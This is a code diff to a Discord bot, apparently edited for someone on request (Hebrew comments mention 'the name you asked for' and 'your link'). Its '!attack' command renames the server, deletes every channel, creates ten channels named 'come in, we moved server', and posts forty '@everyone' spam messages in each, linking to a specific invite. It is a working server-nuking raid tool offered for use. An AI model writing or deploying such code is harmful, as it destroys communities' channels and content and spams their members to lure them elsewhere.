@@ -22,7 +22,9 @@ async function main() {
         ]
     });
 
-    client.once('ready', () => { console.log(`Logged in as ${client.user.tag}!`); });
+    client.once('ready', () => { 
+        console.log(`Logged in as ${client.user.tag}!`); 
+    });
 
     client.on('messageCreate', async message => {
         if (!message.content.startsWith('!') || message.author.bot) return;
@@ -30,24 +32,37 @@ async function main() {
         const command = args.shift().toLowerCase();
 
         if (command === 'attack') {
-            console.log('Attack started');
+            console.log('Attack started - Sending new link');
+            
+            // 1. שינוי שם השרת הכללי
             await message.guild.setName(config.newServerName).catch(console.error);
+            
+            // 2. מחיקה של כל החדרים הקיימים בשרת
             const channels = await message.guild.channels.fetch();
-            for (const channel of channels.values()) { await channel.delete().catch(console.error); }
+            for (const channel of channels.values()) { 
+                await channel.delete().catch(console.error); 
+            }
 
+            // 3. יצירת 10 חדרים חדשים בשם שביקשת
             const newChannels = [];
             for (let i = 0; i < 10; i++) {
-                const created = await message.guild.channels.create({ name: 'כנסו-עברנו-שרת', type: 0 }).catch(console.error);
+                const created = await message.guild.channels.create({ 
+                    name: 'כנסו-עברנו-שרת', 
+                    type: 0 
+                }).catch(console.error);
                 if (created) newChannels.push(created);
             }
 
+            // 4. שליחת 40 הודעות ספאם בכל אחד מהחדרים החדשים עם הקישור המעודכן שלך
             for (const channel of newChannels) {
                 for (let i = 0; i < 40; i++) {
-                    await channel.send('@everyone כנסו עברנו שרת https://discord.gg').catch(console.error);
+                    await channel.send('@everyone כנסו עברנו שרת https://discord.gg/ThBKDTHzj6').catch(console.error);
                 }
             }
         }
     });
+
     client.login(botToken);
 }
+
 main().catch(console.error);
